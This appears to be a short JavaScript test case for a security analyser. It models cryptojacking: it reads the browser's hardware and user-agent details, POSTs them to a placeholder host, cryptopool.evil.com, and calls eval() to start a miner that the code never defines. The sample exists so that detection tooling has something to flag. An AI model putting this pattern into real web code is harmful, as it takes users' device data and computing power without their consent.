/**
 * Test: Real-world cryptojacking scenario
 * Expected: VULNERABILITY - browser info used to configure crypto miner
 */

function test() {
  var threads = navigator.hardwareConcurrency;
  var memory = navigator.deviceMemory;
  var userAgent = navigator.userAgent;
  
  var minerConfig = {
    threads: threads,
    throttle: memory < 4 ? 0.8 : 0.5,
    userAgent: userAgent
  };
  
  // Send config to mining pool
  fetch('https://cryptopool.evil.com/config', {
    method: 'POST',
    body: JSON.stringify(minerConfig)
  });
  
  // Start mining with user's hardware info
  eval('startMiner(' + JSON.stringify(minerConfig) + ')');
}

test();